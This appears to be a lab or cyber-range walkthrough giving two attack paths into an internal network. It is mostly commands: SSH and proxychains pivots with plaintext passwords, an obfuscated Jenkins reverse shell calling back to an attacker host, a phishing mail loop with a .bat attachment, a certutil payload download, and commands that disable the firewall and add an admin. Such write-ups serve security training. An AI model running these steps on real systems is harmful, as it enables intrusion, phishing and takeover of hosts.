# Shortcut

- [Shortcut](#shortcut)
  - [Path 1](#path-1)
  - [Path 2](#path-2)

---

## Path 1

To get access to the internal network, do the following steps:

1) SSH tunnel on 192.168.8.3 (Credential: `iyer` / `Iyer@123`)

```
sudo -u brian ssh -N -D 9050 iyer@192.168.8.3
```

<br/>

2) Edit `/etc/proxychains.conf`. Make sure only socks4 is enabled.

```
socks4 127.0.0.1 9050
```

<br/>

3) With foxyproxy forwarding traffic to SOCK4 server 127.0.0.1:9050, login Jenkins (http://10.1.3.1:1234/) with the credential `autoadmin` / `Jenk!nsADMIN`

<br/>

4) Locally launch a netcat listener.

```
nc -nlvp 443
```

<br/>

5) On Jenkins, go to http://10.1.3.1:1234/script. Then use the following script to get a reverse shell:

```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMS80NDMgMD4mMScK}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

<br/>

6) On the reverse shell, get ncat (https://github.com/ZephrFish/static-tools/raw/master/ncat) from the local machine:

* Local:

```
python3 -m http.server 80
```

* Remote:
```
python -c 'import pty; pty.spawn("/bin/bash")'
cd /tmp && wget http://192.168.100.11/ncat
```

<br/>

7) Create another HTTP proxy via SSH tunnel using ncat:

```
chmod +x ncat && ./ncat -l 4444 --proxy-type http &
```

```
ssh -R 4445:127.0.0.1:4444 brian@192.168.100.11
```

<br/>

8) Modify `/etc/proxychains.conf` to use the HTTP proxy:

```
nano /etc/proxychains.conf
```

Disable the sock4 proxy and add the following:
```
http 127.0.0.1 4445
```

<br/>

9) SSH to the jump server using `jump-admin` / `B@DB!tch`:

```
proxychains ssh jump-admin@10.1.1.4
```

<br/>

10) Use the Jump Server as socks4 proxy:

```
proxychains ssh -N -D 9051 jump-admin@10.1.1.4
```

<br/>

11) Change `/etc/proxychains.conf`:

```
nano /etc/proxychains.conf

sock4 127.0.0.1 9051
```

----

## Path 2

1) Phishing to get a reverse shell from Iyer @ Scientist-Machine

```
for email in $(cat emails.txt); do sendemail -l email.log -f "hafiz@atomic-nuclear.xyz" -u "[IMPORTANT] Research Progress Update" -m $(cat email_msg.txt) -t "$email" -s "atomic-nuclear.site:25" -o tls=no -a ProgressUpdate.bat; done
```

```
nc -nlvp 443
```

<br/>

2) On the attacker machine, launch rpivot listener:

```
python server.py --server-port 8081 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9051
```

<br/>

3) Serve rpivot `client.exe` using python3 http server:

```
cd /usr/share/rpivot && python3 -m http.server 80
```

<br/>

4) On the Scientist Machine, download and call back to the rpivot listener:

```
cd C:\Users\Public && certutil -urlcache -f http://192.168.100.11/client.exe .\client.exe

client.exe --server-ip 192.168.100.11 --server-port 8081
```

<br/>

5) Use `msdat.py` to add `iisadmin` into local admin group. Also enable RDP and disable firewall on the DB-Server.

```
proxychains python msdat.py xpcmdshell -s 10.1.3.2 -p 1433 -U sa -P 'SAAdmin!@#$%' --enable-xpcmdshell --disable-xpcmdshell --disable-xpcmdshell --shell
```

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

```
netsh advfirewall set allprofiles state off
```

```
net localgroup administrators operations\iisadmin /add
```

<br/>

6) RDP to the DB-Server machine:
```
proxychains xfreerdp /size:85% /u:iisadmin /p:'Head!!S%$#@!' /v:10.1.3.2
```